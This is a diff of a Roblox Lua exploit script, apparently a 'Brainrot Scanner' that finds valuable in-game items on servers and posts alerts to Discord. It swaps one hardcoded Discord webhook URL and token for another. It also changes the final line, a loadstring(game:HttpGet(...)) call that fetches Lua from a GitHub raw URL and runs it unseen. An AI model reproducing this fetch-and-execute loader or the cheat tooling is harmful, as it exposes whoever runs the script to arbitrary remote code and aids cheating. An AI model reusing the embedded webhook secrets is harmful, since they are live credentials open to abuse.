@@ -8,7 +8,7 @@ local HttpService = game:GetService('HttpService')
 
 -- ⚙️ НАСТРОЙКИ
 local INCOME_THRESHOLD = 50_000_000 -- 50M/s минимум для уведомления
-local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1422290103522431048/d2JA2afCOlJXJOVBaEoaAWrx3p6fIxKDw6UvjbIbKDLiwpBZ0H-SZbrG8wthxYXobeJ2'
+local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1424140516911484928/mnVh-97c9qW-g8Ymhneg3bkBkV3MgMWkUa3t9tAGHDuMEzb6MAfT3llXK_6ibAHkoRRs'
 
 print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)
 
@@ -56,7 +56,6 @@ local OBJECTS = {
     ['La Spooky Grande'] = { emoji = '🟧', important = true },
     ['Los Mobilis'] = { emoji = '🧕', important = true },
     ['Spooky and Pumpky'] = { emoji = '🎃', important = true, },
-    ['Mieteteira Bicicleteira'] = { emoji = '☠️', important = true },
     ['Meowl'] = { emoji = '🐈', important = true },
     ['Chipso and Queso'] = { emoji = '🧀', important = true },
     ['Chipso And Queso'] = { emoji = '🧀', important = true },
@@ -576,4 +575,4 @@ end)
 
 print('💡 Нажмите F для повторного сканирования')
 print('📱 Discord webhook готов к отправке уведомлений')
-loadstring(game:HttpGet("https://raw.githubusercontent.com/DEBIL59195/KLIMTYPOU/refs/heads/main/KLIM.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ldkoedkeo/eblan2222/refs/heads/main/noob.lua"))()
